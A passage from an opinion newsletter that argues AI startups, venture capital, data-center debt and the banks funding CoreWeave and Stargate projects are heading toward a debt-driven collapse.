2024, less than 10% of VC funds raised in 2021 have made any distributions to their investors . In a piece from September , Carta revealed that \u201cabout 15% of funds\u201d from 2023 have generated any disbursements as of Q2 2025, and the median net internal rate of return was a median 0.1% , meaning that, at best, most investors got their money back and absolutely nothing else . In fact, investing in venture capital has kinda fucking sucked. According to Carta, \u201cAs of the end of Q2, most VC funds across all recent vintages had a\u00a0 TVPI somewhere between 0.8x and 2x. But there are some areas where standout TVPIs are surfacing.\u201d TVPI means Total Value To Paid-in Capital, or the amount of money you made for each dollar invested. This chart may seem confusing, it tells you that for the most part, VCs have struggled to provide even money returns since 2017. A \u201cdecent\u201d TVPI is 2.5x, and as you\u2019ll see, things have effectively collapsed since 2021. Companies are not going public or being acquired at the same rate, meaning that investor capital is increasingly locked up, meaning that limited partners are still waiting for a payoff from the last bubble, let alone this one. Carta would update the piece in December 2025 , and things would somehow get worse. TVPI soured further, suggesting a further lack of exits across the board. The only slight improvement was the median IRR rose to 0.5% for funds from 2021 and 0.1% for funds from 2022. In simple terms, we are looking at years of locked-up capital leaving venture capital cash-starved and a little desperate. The worst part? All of this is happening during a generational increase in the amounts that startups need to raise thanks to the ruinous costs of generative AI, and the negative margins of AI-powered services. To quote myself : Cursor \u2014 Anthropic\u2019s largest customer and now its biggest competitor in the AI coding sphere \u2014 raised $2.3 billion in November after raising $900 million in June [on revenues of $83 million in, I assume, October). Perplexity, one of the most \u201cpopular\u201d AI companies, raised $200 million in September after raising $100 million in July after seeming to fail to raise $500 million in May (I\u2019ve not seen any proof this round closed) after raising $500 million in December 2024 . Cognition raised $400 million in September after raising $300 million in March . Cohere raised $100 million in September a month after it raised $500 million . None of these companies are profitable, nor do they have any path to an acquisition or IPO. Why? Because even the most advanced AI software company is ultimately prompting Anthropic or OpenAI\u2019s models, meaning that their only real intellectual property is those prompts and their staff, and whatever they can build around the models they don\u2019t control, which has been obvious from the meager \u201cacquisitions\u201d we\u2019ve seen so far. Windsurf, which was allegedly being sold to OpenAI, ended up selling its assets to Cognition in July , with Google paying $2.4 billion for its co-founders and a \u201clicensing agreement,\u201d similar to its acquisition of Character.Ai , where it paid $2.7 billion to rehire Noam Shazeer , license its tech, and pay off the stock of its remaining staff. This is also exactly what Microsoft did with Inflection AI and its co-founder Mustafa Suleyman . OpenAI\u2019s acquisitions of Statsig ($1.1bn), Io Products ($6.5bn) and Neptune ($400m) were all-stock. Every other acquisition \u2014 Wiz, Confluent, Informatica, and so on ( CRN has a great list here ) \u2014 is either somebody trying to pretend that (for example) Wiz is related to AI, or trying to say that a data streaming platform is AI-related because AI needs that, which may be true, but doesn\u2019t mean that any AI startups are actually selling. And they\u2019re not, which is a problem, as 41% of US venture dollars in 2025 have gone into AI as of August, and according to Axios, the global number was around 51% . A crisis is brewing. Nerdlawyer, back in October, wrote about the explosive growth of secondary markets : Enter the secondary market\u2014a once-niche corner of venture capital that has transformed into a primary liquidity mechanism. What's remarkable is how quickly this market has matured. At least five major venture funds have hired full-time staff dedicated to manufacturing non-traditional exits. As Hans Swildens, CEO of Industry Ventures, explained: \"All the brand name funds are all staffing and thinking through liquidity structures.\" And professional buyers have flooded in. Mega-funds specializing in secondaries have raised unprecedented amounts: Lexington raised a record $23 billion fund, while HarbourVest, Ardian, and Coller Capital have raised funds in the $10-20 billion range. In simpler terms, there are now Hot Potato Funds, where either another limited partner buys another one\u2019s allocation, the companies themselves buy back their stock, or the stock is resold to other private investors. And they're not alone. The secondary market is projected to handle $122 billion in assets in 2025, yet that still represents just 1.9% of total unicorn value. There's $6+ trillion in untapped liquidity potential. The transformation of the secondary market from emergency tool to standard operating procedure represents the most significant structural shift in venture capital since the rise of unicorns. It's not a temporary fix\u2014it's a permanent evolution driven by misaligned timeframes between fund lifecycles (10 years) and company maturation (11+ years). For better or worse, this is the new reality of startup funding. VCs can no longer afford to simply \"spray and pray\" and wait for exits. They need active liquidity management strategies. And that fundamentally changes what kinds of companies get funded and how. While this piece frames this as a positive, the reality is far grimmer. Venture capitalists are sitting on piles of immovable equity in companies worth far less than they invested at, and the answer, it appears, is to find somebody else to buy the dead weight. According to Newcomer , only 1117 venture funds closed in 2025 (down from 2100 in 2024), and 43% of dollars raised went to the largest venture funds, per The New York Times and PitchBook, suggesting limited partners are becoming less-interested in pumping cash into the system at a time when AI startups are demanding more capital than has ever been raised. How long can the venture capital industry keep handing out $100 million to $500 million to multiple startups a year? Because all signs suggest that the current pace of funding must continue in perpetuity , as nobody appears to have worked out that generative AI is inherently unprofitable, and thus every single company is on the Silicon Valley Welfare System until everybody gives up, or the system itself cannot sustain the pressure. I\u2019ve read too many people make off-handed comments about this \u201cbeing like the dot com boom\u201d and saying that \u201clots of startups might die but what\u2019s left over will be good,\u201d and I hate them for both their flippancy and ignorance. None of the current stack of AI companies can survive on their own, meaning that the venture capital industry is holding them up. If even one of these companies falters and dies, the entire narrative will die. If that happens, it will be harder for AI companies to raise, and even harder to sell an AI company to someone else. This is a punishment for a decade-plus of hubris, where companies were invested in without ever considering a path to profitability. Venture capital has made the same mistake again and again, believing that because Uber, or Facebook, or Airbnb, or any number of companies founded nearly twenty years ago were unprofitable (with paths to profitability in all three cases, mind), it was totally okay to keep pumping up companies that had no path to profitability, which eventually became \u201chad no apparent business model\u201d (see: the metaverse, web3), which eventually became \u201chave negative margins so severe and valuations so high that we will need an IPO at a market cap higher than Netflix.\u201d This is Silicon Valley\u2019s Rot Economy \u2014 the desperate, growth-at-all-costs attachment to startups where you \u201creally like the founder,\u201d where \u201cthe market could be huge\u201d (who knows if it is!), where you just don\u2019t need to worry about profitability because IPOs and exits were easy. Venture capital also used to be easy , because we were still in the era of hypergrowth. You could be a stupid asshole that doesn\u2019t know anything, but there were so many good deals , and the more well-known you were, the more likely you\u2019d be brought them first, guaranteeing a bigger payout, guaranteeing more LP capital, guaranteeing more opportunities that were of a higher quality because you were a big name. It was easier to make a valuable company, easier to get funded, and easier to sell, because the goal was always \u201cget funded, grow as large an audience as possible, or go public/get acquired.\u201d As a result, venture capital encouraged growth-at-all-costs thinking. In 2010, Ben Horwitz said that \u201cthe only thing worse for an entrepreneur than start-up hell (bankruptcy) is start-up purgatory\u201d: when you don\u2019t go bankrupt, but you fail to build the No. 1 product in the space. You have enough money with your conservative burn rate to last for many years. You may even be cash-flow positive. However, you have zero chance of becoming a high-growth company. You have zero chance of being anything but a very small technology business (see Navisite). From the entrepreneur\u2019s point of view, this can be worse than start-up hell since you are stuck with the small company. This poisonous theory paid off, in that startups got used to building high-growth, low-margin companies that would easily sell to other companies or the markets themselves. Until it didn\u2019t, of course. Per Nerdlawyer , IPOs have collapsed as an exit route, along with easy-to-raise capital. Per PitchBook, since 2022, 70% of VC-backed exits were valued at less than the capital put in , with more than a third of them being startups buying other startups in 2024. The money is drying up as the value of VCs\u2019 assets is decreasing , at a time when VCs need more money than ever , because everybody is heavily leveraged in the single-most-expensive funding climate in history. And as we hit this historic liquidity crisis, the two largest companies \u2014 OpenAI and Anthropic \u2014 are becoming drains on the system that, in a very real sense, are participating in a massive redistribution of capital reserved for startups to one of a few public companies. No, really! OpenAI is trying to raise as much as $100 billion in funding so it can continue to pass money to one of a few public companies \u2014 $38 billion to Amazon Web Services over seven years, $22.4 billion to CoreWeave over five years, and $250 billion over an indeterminate period on Microsoft Azure . If successful, OpenAI\u2019s venture telethon will raise more money than has ever been raised in a single round, draining funds that actual startups need. Anthropic has agreed to $70 billion in compute and chip deals across Google, Amazon and Broadcom, and that\u2019s not including the Hut8 compute deal that Google is backing . This money will come from what remains of venture capital, private equity and hyperscaler generosity. Yet elsewhere, even the money that goes to regular startups is ultimately being sent to hyperscalers. That AI startup that needs to keep raising $100 million in a single round isn\u2019t sending that cash to other startups \u2014 it\u2019s mostly going to OpenAI (Microsoft, Amazon, CoreWeave, Google), Anthropic (Google, Microsoft, Amazon), or one of the large hyperscalers for Azure, AWS or Google Cloud. Silicon Valley didn\u2019t birth the next big tech firm. It incubated yet another hyperscaler-level parasite, except instead of just spending money on hyperscaler services (and raising money to do so), both Anthropic and OpenAI actively drain the venture capital system as well, as they both burn billions of dollars. By creating something that\u2019s incredibly expensive to run, they naturally create startups more-dependent on the venture capital system, and the venture capital system has no idea what to do other than say \u201cjust grow, baby!\u201d Both OpenAI and Anthropic\u2019s models might be getting cheaper on a per-million-token basis, but use more tokens, increasing the cost of inference , which in turn increases the costs of startups doing business, which in turn means OpenAI, Anthropic, and all connected startups lose more money, which increases the burn on venture capital. This is a doom-spiral, one that can only be reversed through the most magical and aggressive turnaround we will have seen in history, and it will have to happen next year, without fail. It won\u2019t. So why did venture do this? The Devil\u2019s Deal Of Investing In AI Startups Folks, we haven\u2019t seen values this big in a long time. These are the biggest numbers we\u2019ve ever seen. They\u2019re simply tremendous. OpenAI is maybe worth $830 billion dollars , can you believe that? They lose so much money but folks we don\u2019t worry about that, because they\u2019re growing so fast. We love that Clammy Sam Altman \u2014 they call him \u201cClamuel\u201d \u2014 tells everybody he\u2019s giving them one billion dollars. Data centers are going to have the biggest deals we\u2019ve ever seen, even [ tchhh sound through teeth ] if we have to work with Dario. You see, right now AI startups are big, exciting news for the limited partners funding LLM firms.\u00a0 Things feel exciting because the value of the assets under management (AUM) are going up, which is nothing dodgy, but just how VCs value things and if they are valuing AI stocks, that is how their fees are paid. Investing early in OpenAI allows a VC \u2014 or even an asset manager like Blackstone, which invested in 2024 \u2014 to say it has a big holding and a big increase in its AUM. We are currently in the sowing stage . Nevertheless, AI stocks make VCs who bet on them two years ago look like geniuses on paper. You got in early on OpenAI, Anthropic, Cursor, Cognition, Perplexity or any other company that loves to burn several dollars per dollar of revenue, you have a big, beautiful number, the biggest you\u2019ve ever seen, and your limited partners need to pay you a fee just to manage it. Venture capital hasn\u2019t seen valuations like this in a long time , and on paper , it feels like a lot of VCs got in on companies worth billions of dollars. On paper, Cognition is worth $10.2 billion , Perplexity $18 billion , Cursor $29.3 billion , Lovable $6.6 billion , Cohere $6.8 billion , Replit $3 billion , and Glean $7.2 billion \u2014 massive valuations for companies that all basically do products that OpenAI or Anthropic or Amazon or Google or any number of Chinese companies are already working to clone. They are all losing tons of money and have no path to profitability. But right now the numbers are simply tremendous. I\u2019ve heard venture capitalists tell me that there are times when they have to agree to invest with little to no information or know that they\u2019ll lose the opportunity to another sucker investor. I\u2019ve heard venture capitalists say they don\u2019t have any insight into finances. Venture capitalists would, of course, claim I\u2019m insane, saying that the \u201cgrowth is obviously there\u201d while pointing to whatever startup has made $100 million ARR ($8.3 million in a month), all while not discussing the underlying operating expenses. The idea, I believe, is that the current spate of AI spending is only set to increase next year, and that will\u2026somehow lead to fixing margins? Venture capitalists staunchly refuse to learn anything other than \u201cinvest in growth and then profit from growth,\u201d even if \u201cprofiting from growth\u201d doesn\u2019t seem to be happening anymore. In reality, venture capital shouldn\u2019t have touched LLMs with a fifteen foot pole, because the margins were obviously, blatantly bad from the very beginning. We knew OpenAI would lose $5 billion in the middle of 2024 . A sane venture capital climate would have fucking panicked , but instead chose to double, triple and quadruple down. I believe that massive valuation drawdowns are a certainty. There are losses coming. Venture capitalists, I have to ask you: what happens if OpenAI dies? Do you think that this will make investors interested in funding or acquiring other AI startups? How much longer are we going to do this? When will venture capital realize it\u2019s setting itself up for disaster? And what, exactly, is the plan? OpenAI and Anthropic will suck the lakes dry like an NVIDIA GPU named after Nancy Reagan. How is this meant to continue, and what will be left when it does? The answer is simple: there won\u2019t be money for venture capital for a while. Those AI holdings are going to be worth, at best, 50%, if they retain any value at all. Once one of these startups die, a panic will ensue, sending venture capitalists scrambling to get their holdings acquired, until there\u2019s little or no investor interest left. Why would LPs ever trust venture capital after this? Why would anybody? Because based on the past four years, it doesn\u2019t appear that venture capital is actually good at investing money \u2014 it just got lucky, year after year, until there were few ideas that could sell for hundreds of millions or billions of dollars. Venture capital believed it knew better as it turned its back on basic business fundamentals, starting with Clubhouse, crypto, the metaverse, and now generative AI. Yet they\u2019re far from the only fuckwits on the dickhead express. The Upcoming Data Center Disaster Per Bloomberg , there were at least $178.5 billion in data-center credit deals in the US in 2025, rivaling the $215.4 billion invested in US venture capital in 2024 and the $197.2 billion invested in US VC through August 7 2025 , and over $100 billion more than the $60.69 billion of data center credit deals done in 2024 . I\u2019m very worried, and I\u2019m going to tell you why, using a company called CoreWeave that I\u2019ve been actively warning people about since March . CoreWeave Is Still A Time Bomb By The Way CoreWeave is something called a \u201cneocloud.\u201d It\u2019s a company that sells AI compute, and does so by renting out NVIDIA GPUs, and as I explained a few months ago , it does so by building data centers backed by endless debt: That\u2019s because setting up a neocloud is expensive. Even if the company in question already has data centers \u2014 as CoreWeave did with its cryptocurrency mining operation \u2014 AI requires completely new data center infrastructure to house and cool the GPUs , and those GPUs also need paying for, and then there\u2019s the other stuff I mentioned earlier, like power, water, and the other bits of the computer (the CPU, the motherboard, the memory and storage, and the housing). As a result, these neoclouds are forced to raise billions of dollars in debt, which they collateralize using the GPUs they already have , along with contracts from customers, which they use to buy more GPUs. CoreWeave, for example, has $25 billion in debt on estimated revenues of $5.35 billion , losing hundreds of millions of dollars a quarter. You know who also invests in these neoclouds? NVIDIA! NVIDIA is also one of CoreWeave\u2019s largest customers (accounting for 15% of its revenue in 2024), and just signed a deal to buy $6.3 billion of any capacity that CoreWeave can\u2019t otherwise sell to someone else through 2032 , an extension of a $1.3 billion 2023 deal reported by the Information . It was the anchor investor ($250 million) in CoreWeave\u2019s IPO , too. CoreWeave is one of the largest providers of AI compute in the world, and its business model is indicative of how most data center companies make money, and to explain my concerns, I\u2019m going to explain why using this chart from CoreWeave\u2019s Q2 2025 earnings presentation . First, CoreWeave signs contracts \u2014 such as its $14 billion deal with Meta and $22.4 billion deal with OpenAI \u2014 before it has the physical infrastructure to service them. It then raises debt using this contract as collateral , orders the GPUs from NVIDIA, which arrive after three months, and then take another three months to install, at which point monthly client payments begin. To really simplify this: data center developers are raising money months up to a year before they ever expect to make a penny. In fact, I can find no consistent answer to \u201chow long a data center takes to build,\u201d and the answer here is pretty important, because that\u2019s how the money is gonna get made from these things. You may notice that \u201cmonthly payments\u201d begin at 6 to 30 months, a curious and broad blob of time. You see, data centers are extremely difficult to build, and the concept of an \u201cAI data center\u201d is barely a few years old, with the concept of hundreds of megawatts in one data center campus entirely made up of AI GPUs barely two years old, which means basically everybody building one is doing so for the first time, and even experienced developers are running into problems. For example, Core Scientific, CoreWeave\u2019s weird partner organization it tried and failed to buy , has been trying to convert its Denton Texas cryptocurrency mining data center into an AI data center since November 2024 , specifically so that CoreWeave can rent it to Microsoft for OpenAI. This hasn\u2019t gone well, with the Wall Street Journal reporting a few weeks ago that Denton has been wracked with \u201cseveral months\u201d of delays thanks to rainstorms preventing contractors from pouring concrete. The cluster is apparently going to have 260MW of capacity. What this means for CoreWeave is that it can\u2019t start getting paid by OpenAI, because, per its contract, customers don\u2019t have to start paying until the compute is actually available. This is a very important detail to know for literally any data center development you\u2019ve ever seen. As of its latest Q3 2025 earnings filing , CoreWeave is sitting on $1.1 billion in deferred revenue ( income for services not yet rendered ), up from $951 million in Q2 2025 and $436 million in Q1 2025 . This means deposits have been made, but the contract has yet to be serviced. Now, I\u2019m a curious little critter , so I went and found the 921-page $2.6 billion DDTL 3.0 loan agreement between CoreWeave and banks including Morgan Stanley, MUFG Bank and Goldman Sachs , and in doing so learned the following: OpenAI appears to have net 360 payment terms from CoreWeave \u2014 meaning it can pay literally a year from invoice . Per CoreWeave\u2019s Q3 earnings (page 19), \u201c...on occasion, the Company has granted payment terms up to net 360 days.\u201d Per CoreWeave\u2019s loan agreement (page 12), under \u201ccontract realization ratio,\u201d \u201cthe sum of Projected Contracted Cash Flows applicable for the corresponding three-month period as determined on a net 360 basis.\u201d CoreWeave is required to maintain something called a \u201ccontract realization ratio\u201d of .85x \u2014 meaning that CoreWeave has to make at least 85 cents of every expected dollar or it is\u00a0 in default on their loan. This is important to note because it means that if, say, OpenAI decides not to pay up in a year, CoreWeave will be in real trouble. I apologize, that suggests that CoreWeave isn\u2019t already in trouble. Buried inside NVIDIA\u2019s latest earnings (page 17) there was a little clue: In the third quarter of fiscal year 2026, we entered into an agreement to guarantee a partner's facility lease obligations in the event of their default. The agreement allows our partner to secure a limited-availability facility lease backed by our credit profile, in exchange for issuing us warrants. The maximum gross exposure is $860 million, which is reduced as the partner makes payments to the lessor over five years. The partner has placed $470 million in escrow and executed an agreement to sell the data center cloud capacity, mitigating our default risk. Credit where credit is due \u2014 eagle-eyed analyst JustDario caught this in November \u2014 but in CoreWeave\u2019s condensed consolidated balance sheets, there sits a $477.5 million line-item under \u201crestricted cash and cash equivalents, non-current.\u201d Though this might not be the NVIDIA escrow \u2014 this number shifted from $617m in Q1 to $340m in Q2 \u2014 it lines up all-too-precisely\u2026and who else would NVIDIA be guaranteeing? In any case, CoreWeave is likely getting the best deals in data center debt outside of Oracle. It has top-tier financiers (who I will get to shortly), the full backing of NVIDIA (which is both an investor, customer and apparent financial backstop), and the ability to raise debt quickly . CoreWeave\u2019s deals are likely indicative of how data center financing takes place, and those top-tier financiers? It\u2019s been in basically every deal. In fact\u2026 Who Are The Banks Funding The Data Center Credit Boom? So, I went and dug through a pile of 26 prominent data center loan deals, including the proposed $38 billion debt package that Oracle and Vantage Data Center Partners are raising for Stargate Shackelford and Wisconsin, Stargate Abilene, New Mexico, SoftBank\u2019s $15 billion bridge loan (which I included for a reason that will become obvious shortly) and multiple CoreWeave loans, and found a few commonalities: Blue Owl was present in every single Stargate deal, other than the $38 billion package being raised by Vantage. It also was involved in a $1.3 billion Australian data center debt package by virtue of owning Stack Infrastructure . Remember that name. MUFG (Mitsubishi UFJ Financial Group) was present in 17 out of 26 of the deals, including three separate CoreWeave financings, Stargate New Mexico ($18 billion), the $38 billion Stargate TX/WI deal for Oracle , SoftBank\u2019s bridge loan , and a $5 billion \u201cgreen loan\u201d package for Vantage Data Centers (who are the ones building the Stargate TX/WI data centers). JP Morgan Chase was involved in eight deals, but they were some of the largest \u2014 CoreWeave\u2019s October 2024 financing, DDTL 3.0 and November financing , the funding behind Stargate Abilene , the $38 billion Oracle deal, and Blue Owl\u2019s acquisition of IPI Partners\u2019 Data Centers in 2024 . They also were part of SoftBank\u2019s bridge loan. Deutsche Bank was involved in SoftBank\u2019s bridge loan, but also three smaller deals: a $212 million data center in Seoul , CoreWeave\u2019s 2024 debt, CoreWeave\u2019s November financing , and a data center in Latin America. It also was part of a $610 million data center project in Virginia , as well as a \u20ac1 billion data center project in Germany (invested in with NVIDIA). BNP Paribas? Seven deals: CoreWeave\u2019s DDTL 3.0, Stargate New Mexico, Stargate WI/TX, the acquisition of IPI Partners by Blue Owl, the $212m deal in Seoul, and a data center in Chile . Morgan Stanley? Eight, including CoreWeave\u2019s October 2024, DDTL 3 and November loans, Stargate New Mexico, Stargate WI/TX, EQT\u2019s EdgeConnex financing deal , and, of course, SoftBank\u2019s bridge loan. SMBC (Sumitomo Mitsui Banking Corporation) ? Seven deals, all notable \u2014 CoreWeave\u2019s DDTL 3.0 and November financing, Stargate New Mexico, Stargate TX/WI, a data center in Rowan MD (also involving MUFG, TD Securities and HSBC), as well as the data centers in Chile and Latin America. Oh, and SoftBank\u2019s bridge loan. I realize there are far more data center deals than these, but I wanted to show you exactly how centralized these deals are . The largest deals \u2014 the $38 billion Stargate TX/WI deal and $18 billion Stargate New Mexico deal \u2014 both involved Goldman Sachs, BNP Paribas, SMBC and MUFG, and all four of those companies have, at some point, funded CoreWeave. In fact, everybody appears to have funded CoreWeave at some point \u2014 CitiBank, Credit Agricole, Societe Generale, Wells Fargo, Carlyle, Blackstone, BlackRock, Barclays, Magentar, and Jefferies to name a few. Of the 40 banks and financial institutions I researched, 24 have, at some point, loaned to or organized debt for CoreWeave. Of those institutions, Blackstone, Deutsche Bank, JP Morgan Chase, Morgan Stanley, MUFG and Wells Fargo have done so multiple times. CoreWeave is a deeply unprofitable company saddled with incredible debt and deteriorating margins, with one of its largest clients paying net 360, and, as I\u2019ve said, is arguably the best-financed data center company in the world. What I\u2019m getting at is that most data center deals are likely much worse than the terms that CoreWeave faces, and are likely financed in a similar way , where a client is signed for data center capacity that doesn\u2019t exist, such as when Nebius raised $4.3 billion through a share sale and convertible notes (read: loans) to handle its $17.4 billion data center contract with Microsoft , and guess what? Goldman Sachs acted as lead underwriter on the deal, with assistance from Bank of America, CitiGroup, and Morgan Stanley, all three of which have invested in CoreWeave. The AI Data Center Bubble Is Really, Really Bad AI data centers are expensive, require debt due to the massive cost of construction and GPUs, and all take at least a year, if not two to start generating revenue, at which point they also begin losing money because it seems that renting out AI GPUs is really unprofitable . Every single major bank and financial institution has piled hundreds of millions if not billions of dollars into building data centers that take forever to even start generating money, at which point they only seem to lose it. Worse still, NVIDIA sells GPUs on a one-year upgrade cycle, meaning that all of those data centers being built right now are being filled with Blackwell chips, and by the time they turn on, NVIDIA will be selling its next-generation Vera Rubin chips. Now, you\u2019ve probably heard that Vera Rubin will use the same racks (Oberon) as Blackwell, which is true to an extent , but won\u2019t be true for long, as NVIDIA intends to shift to Kyber racks in 2027 , hoping to build 1MW IT racks (which will involve entire racks-full of power supplies!), meaning that all of those data centers you see today \u2014 whenever they get built! \u2014 will be full of racks incompatible with the next generation of GPUs. This will also decrease the value of the assets inside the data centers, which will in turn decrease the value of the assets held by the firms investing. Stargate Abilene? The one invested in by JP Morgan, Blue Owl, Primary Digital Infrastructure and Societe Generale? The one that\u2019s heavily delayed and won\u2019t be ready until the end of 2026 at earliest? Full to the brim with two-year-old GB200 racks ! By the beginning of 2027, Stargate Abilene will be obsolete, as will any and all data centers filled with Blackwell GPUs, as will any and all data centers being built today. Every single one takes 1-3 years and hundreds of millions (or billions) in debt, every single one faces the same kinds of construction delays, and better yet, almost all of them will turn on in roughly the same time frame. Now, I ain\u2019t no economist, but I do know that \u201csupply and demand\u201d has an effect on pricing. What do you believe happens to the price of renting a Blackwell GPU when all of these data centers come on? Do you think it becomes more valuable? Or less? And while we\u2019re on the subject, what do you think happens if there isn\u2019t sufficient demand? Right now, OpenAI makes up a large chunk of the global sale of compute \u2014 at least $8.67 billion of Azure revenue through September 2025, $22.4 billion of CoreWeave\u2019s backlog, $38 billion of Amazon\u2019s backlog, and so on and so forth \u2014 and made, based on my reporting, just over $4.5 billion in that period . It cannot afford to pay anybody, and nowhere is that more obvious than when it negotiated year-long payment terms for CoreWeave. Otherwise, when you remove the contracts signed by hyperscalers and OpenAI (which I do not believe has paid anybody other than Microsoft yet), based on my analysis , there was less than a billion dollars of AI compute revenue in 2025, or 0.5831% of the money spent on data centers. Hyperscaler revenue is also immediately questionable, with Microsoft\u2019s deal with Nebius ( per its 6k filing ) set to default in the event that Nebius cannot provide the capacity it sold out of its unfinished Vineland, New Jersey data center, which is being built by DataOne, a company which has never built an AI data center with a CEO that has his LinkedIn location set to \u201c United Arab Emirates \u201d with funding from a concrete firm that is also a vendor on the construction project . I also believe Microsoft is setting Nebius up to fail. Based on discussions with sources with direct knowledge of plans for the Vineland, New Jersey data center, Nebius has agreed to timelines that involve having 18,000 NVIDIA B200 and B300 GPUs by the end of January for a total of 50MW, with another 18,000 B300s due by the end of May. On speaking with experts in the field about how viable these plans are, two laughed, and one told me to fuck off. If Nebius fails to build the capacity, Microsoft can walk away, much like OpenAI can walk away from Stargate in the event that Oracle fails to build it on time ( as reported by The Information in April ), and I believe that this is the case for literally any data center provider that\u2019s building a data center for any signed-up tenant. This is another layer of risk to data center development that nobody bothers to discuss, because everybody loves seeing these big, beautiful numbers. Blue Owl In A Coal Mine Except the numbers might have become a little too beautiful for some. A few weeks ago, the Financial Times reported that Blue Owl Capital had pulled out of the $10 billion Michigan Stargate Data Center project , citing \u201cconcerns about its rising debt and artificial intelligence spending.\u201d To quote the FT, \u201cBlue Owl had been in discussions with lenders and Oracle about investing in the planned 1 gigawatt data centre being built to serve OpenAI in Saline Township, Michigan.\u201d What debt, you ask? Well, Blue Owl \u2014 formerly the loosest legs in data center financing \u2014 was in CoreWeave\u2019s $600 million and $750 million debt deals for its planned Virginia data center with Chirisa Technology Parks , as well as a $4 billion CoreWeave data center project in Lancaster, Pennsylvania , Stargate Abilene and Stargate Mexico, Meta\u2019s $30 billion Hyperion data center , and a $1.3 billion data center deal in Australia through Stack Infrastructure, a company it owns through its acquisition of IPI Partners. To be clear, Blue Owl \u201cpulling out\u201d is not the same as a regular deal. It\u2019s a BDC \u2014 Business Development Corporation \u2014 that invests both its own money and rallies together various banks, in this case SMBC, BNP Paribas, MUFG and Goldman Sachs (all part of Stargate New Mexico). The private capital group has been the primary backer for Oracle\u2019s largest data centre projects in the US, investing its own money and raising billions more in debt to build the facilities. Blue Owl typically sets up a special purpose vehicle, which owns the data centre and leases it to Oracle. Blue Owl is incredibly well-connected and experienced in putting together these kinds of deals, and very likely went to the many banks it\u2019s worked with over the years, who apparently had \u201cconcerns about its rising debt,\u201d much of it issued by them! While rumours suggest that Blackstone may \u201cstep in,\u201d the banks that will actually back a $10 billion deal are fairly narrow, and \u201cstepping in\u201d would require billions of dollars and legal logistics. So, why are things looking shaky? Well, remember that thing about how this data center would be leased to Oracle? Well, it had a free cash flow of negative thirteen billion on revenues of $16 billion , with its most-recent earnings only \"beat\" on estimates only thanks to the sale of its $2.68 billion stake in Ampere . Its debt is exploding (with over a billion dollars in interest payments in its last quarter), its GPU gross margins are 14% (which does not mean profitable) , its latest NVIDIA GB200 GPUs have a negative 100% gross margin , and it has $248 billion in upcoming data center leases yet to begin. All, for the most part, to handle compute for one customer: OpenAI, which needs to raise $100 billion, I guess. How The Data Center Apocalypse Could Commence We\u2019ve already got some signs of concern within the banking world around data center exposure. In November, the FT reported that Deutsche Bank \u2014 which backed CoreWeave multiple times and several data centers \u2014 was \u201cexploring ways to hedge its exposure to data centers after extending billions of dollars in debt,\u201d including shorting a \u201cbasket of AI-related stocks\u201d or buying default protection on some of its debt using synthetic risk transfers , which are when a bank sells the full or partial credit risk of a loan (or loans) to another bank while keeping the loans on their book, paying a monthly fee to investors (this is a simplification). In December, Fortune reported that Morgan Stanley (CoreWeave three times, IPI Partners, Hyperion, SoftBank Bridge Loan) was also considering synthetic risk transfers on \u201cloans to businesses involved in AI infrastructure.\u201d Back in April , SMBC sold synthetic risk transfers tied to \u201cprivate debt BDCs\u201d \u2014 and while this predates the large data center deals done by Blue Owl, SMBC has overseen multiple Blue Owl deals in the past. In December, SMBC closed another SRT , selling off risk from \u201cAustralian and Asian project finance loans,\u201d though I can\u2019t confirm if any of them were data center related. In December, Goldman Sachs paused a planned mortgage-bond sale for data center operator CyrusOne , with the intent to revive it in the first quarter of 2026. Oracle\u2019s credit risk reached a 16-year high in the middle of December , with credit default swaps (basically, betting that Oracle will default on its debts, an unlikely yet no-longer-impossible event) climbing to their highest price since the great financial crisis. While Morgan Stanley and Deutsche Bank\u2019s SRTs are yet to close, it\u2019s still notable that two of the largest players in data center financing feel the need to hedge their bets. So, what exactly are they hedging against? Simple! That tenants won\u2019t arrive and debts won\u2019t get paid. I also believe they\u2019re going to need bigger hedges, because I don\u2019t think there is enough actual demand for AI to meet the data centers being built, and I think most data center loans end up being underwater within the next two years. The \u201cChain of Pain\u201d That Bursts The AI Bubble I realize we\u2019ve taken a great deal of words to get here, but every single part was necessary to explain what I think happens next. Let\u2019s start by quoting my premium newsletter from a few weeks ago : While many people talk about how circular the AI bubble may or may not be, the reality is that it's far more like a chain \u2014 a deeply vulnerable one held together by debt and venture capital. A company buys GPUs from NVIDIA, at which point nobody is making any profit anymore. These GPUs are purchased, for the most part, using debt provided by banks or financial institutions. While hyperscalers can and do fund GPUs using cashflow, even they have started to turn to debt. At that point, the company that bought the GPUs sinks hundreds of millions of dollars to build a data center, and once it turns on, provides compute to a model provider, which then begins losing money selling access to those GPUs . For example, both OpenAI and Anthropic lose billions of dollars, and both rely on venture capital to fund their ability to continue paying for accessing those GPUs. At that point, OpenAI and Anthropic offer either subscriptions \u2014 which cost far more to offer than the revenue they provide \u2014 or API access to their models on a per-million-token basis. AI startups pay to access these models to run their services, which end up costing more than the revenue they make, which means they have to raise venture capital to continue paying to access those models . Outside of hyperscalers paying NVIDIA for GPUs out of cashflow, none of the AI industry is fueled by revenue. Every single part of the industry is fueled by some kind of subsidy. As a result, the AI bubble is really a stress test of the global venture capital, private equity, private credit, institutional and banking system, and its willingness to fund all of this forever, because there isn't a single generative AI company that's got a path to profitability. You see, every little link in the chain of pain is necessary to understand things. The enshittified stock market, pumped not by actual cashflow or productivity but by signals read by analysts and investors trained over decades to push consumer investors to invest in magnificent 7 stocks that represent as much as 40% of the value of the S&amp;P 500 , their values pumped by analysts and the media misleading investors into believing that their revenue growth is anything to do with AI. Venture capital\u2019s liquidity crisis, one peaking at a time when AI startups have become more capital-intensive than any other point in history. Ballooning, centralized data center debt, funded based on customer contracts or built for demand that doesn\u2019t exist, funding massive data centers of GPUs that immediately become commoditized as a result of the hysteria. In really simple terms, I believe that almost every investment in a data center or AI startup may go to zero. Let me explain. If we assume that 50% of $171.5 (so $85.75) billion in data center debt is in GPUs, that\u2019s around 3.2GW of data center capacity, based on my model of NVIDIA\u2019s approximate split of sales between different AI GPUs from my premium piece last week . The likelihood of the majority of these projects being A) completed within the next year and B) completed on budget is very, very small. Every delay increases the likelihood of default, as each of these projects is heavily debt-based. The customers of these projects are either hyperscalers (who are only \u201cdoing AI\u201d because they have no other hypergrowth ideas and because Wall Street currently approves) or AI startups, all of whom are unprofitable. While there are potentially hedge funds or other companies looking for \u201cprivate AI\u201d integrations, I think this is a very, very small market. On top of that, AI compute itself may not be profitable, and because, by my estimate, everybody has spent about $85 billion on filling data centers with the same GPUs, the aggregate price of renting out GPUs will decline. Already the average price of Blackwell GPUs has declined to an average of $4.41 an 